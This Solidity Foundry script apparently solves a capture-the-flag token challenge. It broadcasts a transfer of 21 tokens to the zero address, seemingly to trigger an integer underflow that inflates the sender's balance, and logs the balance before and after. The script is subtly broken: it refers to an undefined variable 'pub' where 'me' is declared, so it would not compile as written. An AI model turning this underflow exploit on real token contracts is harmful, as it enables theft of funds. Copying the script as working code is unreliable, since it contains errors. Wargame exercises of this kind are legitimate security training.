// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import { Token } from "../src/Token.sol";

contract TokenSolver is Script {

	Token public instance = Token(0x5b84Aee912D7B4247787230E9057f07feAc1143F);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run() external {
		vm.startBroadcast(prv);

		console.log("before attack --> ", instance.balanceOf(pub));
		instance.transfer(address(0), 21);
		console.log("aftA attack --> ", instance.balanceOf(pub));

		vm.stopBroadcast();
	}

}

